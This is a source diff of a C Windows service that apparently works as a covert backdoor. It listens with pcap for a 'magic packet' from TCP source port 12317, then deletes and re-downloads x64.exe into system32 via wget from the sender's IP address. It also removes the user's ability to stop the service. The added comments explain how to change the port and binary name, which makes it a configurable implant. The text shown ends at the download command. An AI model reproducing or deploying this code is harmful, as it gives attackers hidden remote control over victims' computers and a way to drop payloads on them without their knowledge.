@@ -97,8 +97,8 @@ void ServiceMain(int argc, char** argv)
  
    ServiceStatus.dwServiceType = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING; 
-   //ServiceStatus.dwControlsAccepted   =  SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-   ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
+   //ServiceStatus.dwControlsAccepted   =  SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; // Uncomment this line if you want the user the ability to stop the service. 
+   ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN; // At the very least allow the service to be shut down for reboots.
    ServiceStatus.dwWin32ExitCode = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint = 0; 
@@ -145,16 +145,6 @@ void ServiceMain(int argc, char** argv)
 			char buffer[256];
 			sprintf(buffer, "%d. %s", ++i, d->name);
 			WriteToLog(buffer);
-			/*
-			if (d->description)
-			{
-				printf(" (%s)\n", d->description);
-			}
-			else
-			{
-				printf(" (No description available)\n");
-			}
-			*/
 		}
 
 		if(i==0)
@@ -164,17 +154,9 @@ void ServiceMain(int argc, char** argv)
 			WriteToLog(buffer);
 			return;
 		}
+
+		inum = 1; // force to listen on the first listed interface. 
 		/*
-		if(argc < 2)
-		{
-			char buffer[256];
-			sprintf(buffer, "\nERROR: Enter interface number!\n");
-			WriteToLog(buffer);
-			return -1;
-		}
-		sscanf(argv[1], "%d", &inum);
-		*/
-		inum = 1;
 		if(inum < 1 || inum > i)
 		{
 			char buffer[256];
@@ -184,7 +166,7 @@ void ServiceMain(int argc, char** argv)
 			pcap_freealldevs(alldevs);
 			return;
 		}
-
+		*/
 		/* Jump to the selected adapter */
 		
 		for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
@@ -266,14 +248,6 @@ void ControlHandler(DWORD request)
 { 
    switch(request) 
    { 
-		/*
-      case SERVICE_CONTROL_STOP: 
-
-         ServiceStatus.dwWin32ExitCode = 0; 
-         ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
-         SetServiceStatus (hStatus, &ServiceStatus);
-         return; 
-		*/
       case SERVICE_CONTROL_SHUTDOWN: 
 
          ServiceStatus.dwWin32ExitCode = 0; 
@@ -321,14 +295,14 @@ void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_cha
 		sport = ntohs( th->sport );
 		dport = ntohs( th->dport );
 	
-		if (sport == 12317) {
+		if (sport == 12317) { //Change this if you want it to listen on a different port.
 		
 			char buffer[256];
 			sprintf(buffer,"\nRecieved Happy Magic Packet\n");
 			WriteToLog(buffer);
 		
 			// delete x.exe in case it already exsists.
-			remove( "c:\\windows\\system32\\x64.exe" );
+			remove( "c:\\windows\\system32\\x64.exe" );  //Change this and the next few lines if you want to name your binary something else.
 			
 			char cmd[255];	
 			sprintf(cmd, "\"c:\\windows\\system\\wget.exe http://%d.%d.%d.%d/x64.exe\"", ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4 ); 
